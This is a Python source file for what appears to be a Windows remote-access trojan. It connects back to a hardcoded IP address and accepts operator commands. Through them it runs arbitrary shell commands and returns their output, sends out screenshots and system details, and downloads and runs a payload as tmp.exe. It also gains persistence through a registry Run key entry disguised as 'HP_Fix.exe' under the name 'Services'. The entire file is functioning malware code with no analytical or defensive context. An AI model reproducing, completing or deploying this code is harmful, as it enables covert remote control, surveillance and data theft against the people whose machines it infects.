import socket
import os
import subprocess
from multiprocessing import Process,current_process
from threading import Thread
import struct
import platform
from time import sleep
import pyautogui
from json import load
from urllib import request
import winreg
import base64 as b64

#Useless func
def create_botserver():
    ip = load(request.urlopen("https://api.ipify.org/?format=json"))['ip']
    port = 2000
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip,port))
    ss.listen()
    while True:
        con,addr = ss.accept()
        con.send("ALIVE".encode())
        resp = con.recv(1024).decode()
        if(resp == "RESTART"):
            main()
        elif(resp == "KILL"):
            quit()
        elif(resp == "OK"):
            continue
        else:
            pass

def process_shell(cmd,s):
    try:
        #print(cmd)
        pipe = subprocess.Popen(cmd,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        output = pipe.stdout.read()
        s.send("DONE".encode())
        #print(output.decode())
        s.send(output)
        #print("Sent")
    except:
        s.send("FAILED".encode())


def start_regitry_edit():
    try:
        name_file = "HP_Fix.exe"
        pwd = str(os.getcwd())
        path = "Software\Microsoft\Windows\CurrentVersion\Run"
        name = "Services"
        value = pwd + "\\" + name_file
        winreg.CreateKey(winreg.HKEY_CURRENT_USER,path)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,path,0,winreg.KEY_WRITE)
        winreg.SetValueEx(key,name,0,winreg.REG_SZ, value)
        winreg.CloseKey(key)
        print("Values written")
        return True
    except PermissionError:
        return False
    except Exception as ee:
        print("Error : %s"%(str(ee)))
        return False

def start_session(s):
    while True:
        try:
            cmd = s.recv(1024).decode()

            if "pid" in cmd:
                pid = str(os.getpid())
                s.send(pid.encode())

            if "OS" in cmd:
                os_name = platform.system()
                os_processor = platform.processor()
                os_info = platform.platform()
                os_user = platform.node()
                details = "Operating System : %s\n"%(str(os_name))
                details += "Processor : %s\n"%(str(os_processor))
                details += "Version : %s\n"%(str(os_info))
                details += "User(node) : %s\n"%(str(os_user))
                s.send(details.encode())

            if "REGISTRY" in cmd:
                try:
                    if(start_regitry_edit()):
                        s.send("OK".encode())
                    else:
                        s.send("FAILED".encode())
                except:
                    s.send("FAILED".encode())

            if "screenshot" in cmd:
                try:
                    extension = ".png"
                    pyautogui.screenshot("HP" + extension)
                    file = open("HP"+extension,'rb')
                    data = file.read()
                    file.close()
                    data = b64.b64encode(data)
                    size = len(data)
                    s.send("OK".encode())
                    sleep(1)
                    #s.send(str(size).encode())
                    #sleep(1)
                    s.send(data)
                except Exception as e:
                    print("[*] Error : %s"%(str(e)))
                    s.send("FAILED".encode())

            if "CHECK" in cmd:
                s.send("YES".encode())

            if "shell" in cmd:
                cmd = cmd.strip("shell ")
                try:
                    pipe = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                    output = pipe.stdout.read()
                    s.send("DONE".encode())
                    sleep(1)
                    s.send(output)
                except Exception as e:
                    print("[*] Shell execution failed")
                    print("[*] Error : %s"%(str(e)))
                    s.send("FAILED".encode())
                    pass

            if "restart" in cmd:
                try:
                    payload = s.recv(4096000)
                    file = open("tmp.exe",'wb')
                    file.write(payload)
                    file.close()
                    path = os.getcwd()
                    subprocess.Popen("%s/tmp.exe",creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
                    s.send("DONE".encode())
                except Exception as e:
                    print("Error : %s"%(str(e)))

            if "GETSHELL" in cmd:
                shell_cmd = s.recv(1024).decode()
                process_shell(shell_cmd,s)

            if "execute" in cmd:
                #print("Original : %s"%(cmd))
                cmd = cmd.strip("execute").strip('\r')
                #print("Command received : %s"%(cmd))
                try:
                    pipe = subprocess.call(cmd,shell=True)
                    if(pipe == 0):
                        s.send("SUCCESS".encode())
                    else:
                        s.send("FAILED".encode())
                except:
                    pass
        #    cmd_size = struct.unpack("<H",cmd[:2])
        #    cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
        #    if "execute" in cmd:
        #        cmd = cmd.strip("execute ")

        except socket.error:
            main()
        except Exception as e:
            print("Error : %s"%(str(e)))

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("159.65.11.28",2003))
            #print("Connected")
            conn_process = Thread(target=start_session,args=(s,))
            conn_process.start()
            conn_process.join()
        except socket.error:
            #print("Attempting to reconnect...")
            main()
        except:
            print("Unknown error occured")

if __name__ == '__main__':
    #path = os.getcwd()
    #subprocess.Popen("%s/bot.exe"%(path),creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)

    main_thread = Thread(target=main,args=())
    #main_thread.setmDaemon(True)
    main_thread.start()
